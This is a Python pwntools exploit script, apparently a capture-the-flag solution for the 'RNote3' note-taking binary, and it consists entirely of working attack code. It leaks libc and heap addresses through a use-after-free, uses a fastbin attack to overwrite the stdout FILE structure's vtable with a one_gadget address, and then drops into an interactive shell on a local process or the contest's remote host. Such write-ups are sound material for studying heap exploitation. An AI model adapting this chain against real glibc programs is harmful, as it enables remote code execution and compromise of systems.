#!/usr/bin/env python
from pwn import *

def add(title, size, content):
    s.sendline('1')
    s.sendlineafter('title: ', title)
    s.sendlineafter('size: ', str(size))
    s.sendlineafter('content: ', content)

def view(title):
    s.sendline('2')
    s.sendlineafter('title: ', title)
    s.recvuntil('title: ')
    ret = [s.recvline(False)]
    s.recvuntil('content: ')
    ret.append(s.recvline(False))
    return ret

def edit(title, content):
    s.sendline('3')
    s.sendlineafter('title: ', title)
    s.sendlineafter('content: ', content)

def delete(title = 'dummy'):
    s.sendline('4')
    s.sendlineafter('title: ', title)

if __name__ == '__main__':
    if len(sys.argv) == 1:
        s = process('./RNote3', env = {'LD_PRELOAD': './libc.so.6'})
    else:
        s = remote('rnote3.2018.teamrois.cn', 7322)

    libc = ELF('./libc.so.6')

    add('A', 0x88, 'A')
    add('B', 0x88, 'B')
    add('C', 0x88, 'C')
    add('D', 0x88, 'D')
    edit('A', 'A')
    delete()
    libc_base = u64(view('')[1].ljust(8, '\0')) - 0x3c4b78
    log.info('libc base: %#x' % libc_base)

    edit('B', 'B')
    delete()
    delete('C')
    add('E', 0x18, 'B')
    heap_addr = u64(view('B')[1].ljust(8, '\0')) - 0x20
    log.info('heap address: %#x' % heap_addr)

    add('a', 0x68, 'a')
    add('b', 0x68, 'b')
    edit('a', 'a')
    delete()
    edit('b', 'b')
    delete()
    edit('', 'a')
    delete()

    one_gadgets = [0x45216, 0x4526a, 0xf02a4, 0xf1147]

    add(p64(0)[:-1], 0x68, p64(libc_base + libc.symbols['_IO_2_1_stdout_'] + 0x9d))
    add('c', 0x68, 'c')
    add('d', 0x68, 'd')
    vtable = [p64(0)] * 0x13
    vtable[7] = p64(libc_base + one_gadgets[1])
    add('e', 0x100, ''.join(vtable))
    add('f', 0x68, '\0' * 0x2b + p64(heap_addr + 0x2d0))

    s.sendline('1')

    s.interactive()
